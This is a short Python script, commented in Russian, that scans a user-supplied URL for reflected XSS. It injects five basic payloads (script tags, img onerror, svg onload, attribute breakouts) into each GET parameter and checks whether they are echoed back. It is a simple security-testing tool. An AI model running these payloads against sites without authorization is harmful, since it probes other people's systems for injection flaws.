import requests
import time
import sys
import urllib.parse

def typewriter(text, delay=0.03):
    """Анимация печатания текста"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # Перевод строки в конце

def get_all_params(url):
    """Извлекает GET-параметры из URL"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = {k: v[0] if v else '' for k, v in params.items()}
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return base_url, params

def test_xss_payload(url, params, payload):
    """Проверяет, отражается ли payload в ответе"""
    test_params = params.copy()
    for key in test_params:
        test_params[key] = payload
        query = urllib.parse.urlencode(test_params)
        test_url = f"{url}?{query}"
        try:
            response = requests.get(test_url, timeout=10)
            if payload in response.text:
                return True, key
        except requests.RequestException:
            continue
    return False, None

def main():
    typewriter("Введите URL для проверки на XSS:")
    target_url = input().strip()

    # Добавляем схему, если её нет
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    # Проверка доступности сайта
    try:
        requests.get(target_url, timeout=10)
    except requests.RequestException:
        typewriter("❌ Ошибка: Не удалось подключиться к указанному URL.")
        return

    base_url, params = get_all_params(target_url)

    if not params:
        typewriter("⚠️  В URL отсутствуют GET-параметры. Сканер работает только с параметрами в URL.")
        return

    typewriter(f"🔍 Найдены параметры: {', '.join(params.keys())}")
    typewriter("🚀 Начинаю проверку на XSS...")

    # Базовые XSS-полезные нагрузки
    payloads = [
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\" onfocus=alert(1) autofocus=\"",
        "<svg onload=alert(1)>"
    ]

    vulnerable = False
    for i, payload in enumerate(payloads, 1):
        typewriter(f"  Проверка payload #{i}...", delay=0.01)
        found, param = test_xss_payload(base_url, params, payload)
        if found:
            typewriter(f"  💥 Уязвимость найдена! Payload сработал в параметре: {param}")
            vulnerable = True
            break

    if vulnerable:
        typewriter("❗ Сайт может быть уязвим к XSS-атакам!")
    else:
        typewriter("✅ XSS-уязвимости не обнаружены (на базовом уровне).")

if __name__ == "__main__":
    main()
